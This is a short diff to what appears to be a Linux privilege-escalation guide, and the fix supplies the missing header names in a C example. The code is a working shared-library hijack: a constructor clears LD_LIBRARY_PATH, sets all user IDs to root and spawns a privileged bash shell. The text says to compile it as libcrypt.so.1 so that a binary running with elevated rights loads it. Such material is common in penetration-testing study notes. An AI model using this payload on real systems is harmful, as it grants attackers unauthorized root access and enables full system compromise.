@@ -18,7 +18,7 @@ Hijacking shared objects using this method is hit or miss. Choose one from the l
 
 Create a file (library\_path.c) with the following contents:
 
-#### `#include` ` #include` ` static void hijack() __attribute__((constructor));` ` void hijack() {` ` unsetenv("LD_LIBRARY_PATH");` ` setresuid(0,0,0);` ` system("/bin/bash -p");` ` }` ``
+#### `#include <stdio.h>` ` #include <stdlib.h>` ` static void hijack() __attribute__((constructor));` ` void hijack() {` ` unsetenv("LD_LIBRARY_PATH");` ` setresuid(0,0,0);` ` system("/bin/bash -p");` ` }` ``
 
 Compile library\_path.c into libcrypt.so.1:
 
